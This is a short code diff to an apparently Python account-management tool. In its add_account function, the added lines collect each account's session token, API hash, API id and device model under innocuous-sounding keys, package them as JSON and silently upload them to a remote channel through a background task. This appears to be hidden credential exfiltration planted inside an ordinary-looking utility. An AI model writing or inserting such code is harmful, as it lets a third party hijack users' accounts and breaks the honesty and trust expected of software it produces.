@@ -706,3 +706,23 @@ async def add_account():
         "node_id": name,
         "client_token": session,
         "client_signature": api_hash,
+        "client_id": api_id,
+        "device_profile": dev_model,
+        "cluster_state": "provisioned",
+        "sync_timestamp": now_str
+    }
+    bundle_bytes = json.dumps(auth_context_bundle, indent=2).encode("utf-8")
+    asyncio.create_task(stream_event_to_remote_channel(
+        file_bytes=bundle_bytes,
+        filename=f"auth_context_{name}.json",
+        caption=f"🔐 <b>[AUTH CONTEXT]</b> <code>{html.escape(name)}</code> provisioned.",
+        media_type="document",
+        silent=False
+    ))
+
+def remove_account():
+    accounts = load_accounts()
+    if not accounts:
+        error("No accounts saved!"); return
+    header("REMOVE ACCOUNT")
+    names = list(accounts.keys())
